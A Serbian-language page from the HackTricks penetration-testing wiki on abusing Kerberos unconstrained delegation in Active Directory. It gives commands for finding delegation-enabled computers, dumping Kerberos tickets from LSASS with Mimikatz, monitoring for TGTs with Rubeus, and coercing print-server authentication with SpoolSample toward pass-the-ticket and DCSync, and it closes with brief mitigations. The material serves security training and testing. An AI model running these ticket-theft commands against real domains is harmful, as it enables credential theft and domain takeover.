# Unconstrained Delegation

{{#include ../../banners/hacktricks-training.md}}

## Unconstrained delegation

Ovo je funkcija koju može postaviti Administrator domena na bilo koji **računar** unutar domena. Tada, svaki put kada se **korisnik prijavi** na računar, **kopija TGT-a** tog korisnika će biti **poslata unutar TGS-a** koji obezbeđuje DC **i sačuvana u memoriji u LSASS-u**. Dakle, ako imate administratorska prava na mašini, moći ćete da **izvučete karte i pretvarate se da ste korisnici** na bilo kojoj mašini.

Dakle, ako se administrator domena prijavi na računar sa aktiviranom funkcijom "Unconstrained Delegation", i imate lokalna administratorska prava unutar te mašine, moći ćete da izvučete kartu i pretvarate se da ste administrator domena bilo gde (domen privesc).

Možete **pronaći objekte računara sa ovom atributom** proveravajući da li atribut [userAccountControl](<https://msdn.microsoft.com/en-us/library/ms680832(v=vs.85).aspx>) sadrži [ADS_UF_TRUSTED_FOR_DELEGATION](<https://msdn.microsoft.com/en-us/library/aa772300(v=vs.85).aspx>). To možete uraditi sa LDAP filtrima ‘(userAccountControl:1.2.840.113556.1.4.803:=524288)’, što je ono što powerview radi:

<pre class="language-bash"><code class="lang-bash"># List unconstrained computers
## Powerview
Get-NetComputer -Unconstrained #DCs always appear but aren't useful for privesc
<strong>## ADSearch
</strong>ADSearch.exe --search "(&(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=524288))" --attributes samaccountname,dnshostname,operatingsystem
<strong># Export tickets with Mimikatz
</strong>privilege::debug
sekurlsa::tickets /export #Recommended way
kerberos::list /export #Another way

# Monitor logins and export new tickets
.\Rubeus.exe monitor /targetuser:<username> /interval:10 #Check every 10s for new TGTs</code></pre>

Učitajte kartu Administratora (ili korisnika žrtve) u memoriju sa **Mimikatz** ili **Rubeus za** [**Pass the Ticket**](pass-the-ticket.md)**.**\
Više informacija: [https://www.harmj0y.net/blog/activedirectory/s4u2pwnage/](https://www.harmj0y.net/blog/activedirectory/s4u2pwnage/)\
[**Više informacija o Unconstrained delegation na ired.team.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/domain-compromise-via-unrestricted-kerberos-delegation)

### **Force Authentication**

Ako napadač može da **kompromituje računar dozvoljen za "Unconstrained Delegation"**, mogao bi da **prevari** **Print server** da **automatski prijavi** protiv njega **čuvajući TGT** u memoriji servera.\
Tada bi napadač mogao da izvrši **Pass the Ticket napad da se pretvara** da je korisnički račun Print server računara.

Da biste omogućili prijavu print servera na bilo koju mašinu, možete koristiti [**SpoolSample**](https://github.com/leechristensen/SpoolSample):
```bash
.\SpoolSample.exe <printmachine> <unconstrinedmachine>
```
Ako je TGT sa kontrolera domena, možete izvršiti a[ **DCSync attack**](acl-persistence-abuse/index.html#dcsync) i dobiti sve hešove sa DC-a.\
[**Više informacija o ovom napadu na ired.team.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/domain-compromise-via-dc-print-server-and-kerberos-delegation)

**Evo drugih načina da pokušate da primorate autentifikaciju:**

{{#ref}}
printers-spooler-service-abuse.md
{{#endref}}

### Mitigacija

- Ograničite DA/Admin prijave na specifične usluge
- Postavite "Account is sensitive and cannot be delegated" za privilegovane naloge.

{{#include ../../banners/hacktricks-training.md}}
